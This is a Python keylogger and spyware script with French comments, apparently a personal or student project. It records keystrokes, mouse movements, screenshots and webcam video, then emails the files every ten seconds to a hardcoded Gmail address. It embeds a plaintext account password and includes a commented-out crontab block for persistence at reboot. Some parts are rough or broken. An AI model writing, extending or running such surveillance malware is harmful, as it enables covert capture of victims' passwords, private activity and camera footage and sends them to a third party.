import logging
from threading import Thread

import cv2
from pynput.keyboard import Key, Listener
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
from pynput import mouse
import time
import os
import PIL.ImageGrab

from test.testWebCam import frame_width

"""
#--------DÉBUT TÂCHES PROGRAMMÉES---------------

# Chemin vers le script Python
python_script = os.getcwd()+'/keylogger'

path_env = '../'

# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"

# Obtenir la crontab actuelle de l'utilisateur
current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)

# Vérifier si le script est déjà dans la crontab
if cron_job not in current_cron.stdout:
    # Ajouter la nouvelle tâche à crontab
    new_cron = current_cron.stdout + cron_job + "\n"
    subprocess.run(['crontab', '-'], input=new_cron, text=True)
    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
else:
    print("Le script Python est déjà dans crontab.")

#--------FIN TÂCHES PROGRAMMÉES----------------

"""

#--------DÉBUT PARTIE ENVOI MAIL----------------

def sendMail():
    # Configuration pour l'envoi de mail
    port = 465
    smtp_server = "smtp.gmail.com"
    sender_email = "amazonoussama640@gmail.com"  # adresse mail bidon d'où le mail va être envoyé
    receiver_email = "oussamaau123@gmail.com"    # adresse mail sur laquelle on veut recevoir le mail
    password = "tdcf hoql nrco flxv"             # mot de passe de l'expéditeur
    objet = "Fichier du keylog"
    corps = "Envoi du fichier keylog"

    # Création d'un mail multipart
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = objet

    message.attach(MIMEText(corps, "plain"))

    filename = "keylogs.txt"
    filename2 = "mouse.txt"
    filename3 = "screen.png"
    filename4="output.mp4"

    """
    try:
        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )
        message.attach(part)

    except FileNotFoundError:
        return
    """
    try:
        with open(filename2, "rb") as attachment:
            part2 = MIMEBase("application", "octet-stream")
            part2.set_payload(attachment.read())
        encoders.encode_base64(part2)
        part2.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename2}",
        )
        message.attach(part2)

    except FileNotFoundError:
        return


    try:
        with open(filename4,"rb") as attachment:
            part4 = MIMEBase("application","octet-stream")
            part4.set_payload(attachment.read())
        encoders.encode_base64(part4)
        part4.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename4}",
        )
        message.attach(part4)

    except FileNotFoundError:
        return

    try:
        with open(filename3, "rb") as attachment:
            part3 = MIMEBase("application", "octet-stream")
            part3.set_payload(attachment.read())
        encoders.encode_base64(part3)
        part3.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename3}",
        )
        message.attach(part3)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        print("Le mail a été envoyé")
    except Exception as e:
        print(f"Erreur lors de l'envoi : {e}")

#--------FIN PARTIE ENVOI MAIL------------------

#--------DÉBUT PARTIE RÉCOLTE SOURIS --------------

logging.basicConfig(
    filename="mouse.txt",
    filemode='w',
    datefmt='%I:%M:%S %p',
    format='%(asctime)s - %(message)s',
    level=logging.DEBUG
)
logging.debug("Mouse tracking started.")  # Message initial pour marquer le début de la traçabilité

previous_position = (0, 0)  # Initialisation de la position précédente pour le calcul de la direction


def on_mouse_move(mouse_position_x, mouse_position_y):
    global previous_position
    x_prev, y_prev = previous_position
    direction = ""

    if mouse_position_x > x_prev:
        direction += "right "
    elif mouse_position_x < x_prev:
        direction += "left "
    if mouse_position_y > y_prev:
        direction += "down"
    elif mouse_position_y < y_prev:
        direction += "up"

    previous_position = (mouse_position_x, mouse_position_y)  # Mise à jour de la position

    message = f"The mouse has moved to ({mouse_position_x}, {mouse_position_y}) - Direction: {direction.strip()}"
    print(message)
    logging.debug(message)


def on_mouse_click(mouse_position_x, mouse_position_y, button, is_pressed):
    if button == mouse.Button.middle and is_pressed:
        message = "Middle mouse button pressed! It's special!"
    else:
        message = f"Mouse button pressed: {button} | Is pressed: {is_pressed}"

    print(message)
    logging.debug(message)


#--------FIN PARTIE RÉCOLTE SOURIS ----------------

#-------- DÉBUT RÉCOLTE CAPTURE D'ÉCRAN -----------

def screen():
    screen = PIL.ImageGrab.grab()
    path = os.getcwd()
    path+="/screen.png"
    screen.save(path)

#--------- FIN RÉCOLTE CAPTURE D'ÉCRAN -----------


logging.basicConfig(filename="keylogs.txt", filemode="w",
                    datefmt='%d/%m/%Y %I:%M:%S %p', format='%(asctime)s:%(message)s', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

def CaptureCamera():
    camera = cv2.VideoCapture(0)

    frame_width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))

    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 20.0, (frame_width, frame_height))

    #A revoir pour cette partie du code car pas sûr
    while True:
        ret, frame = camera.read()
        if not ret:
            break
        out.write(frame)
        cv2.imshow('Camera', frame)

        if cv2.waitKey(1) == ord('q'):
            break


# Fonction pour exécuter `sendMail` toutes les 10 secondes dans un thread séparé
def mail_thread():
   mouse_listener = mouse.Listener(
       on_move=on_mouse_move,
       on_click=on_mouse_click,
   )
   mouse_listener.start()

   while True:
       time.sleep(10)
       screen()
       mouse_listener.stop()
       mouse_listener.join()
       sendMail()


# L'envoi du mail se fait sur un thread séparé
Thread(target=mail_thread, daemon=True).start()


with Listener(on_press=on_press) as listener:
    listener.join()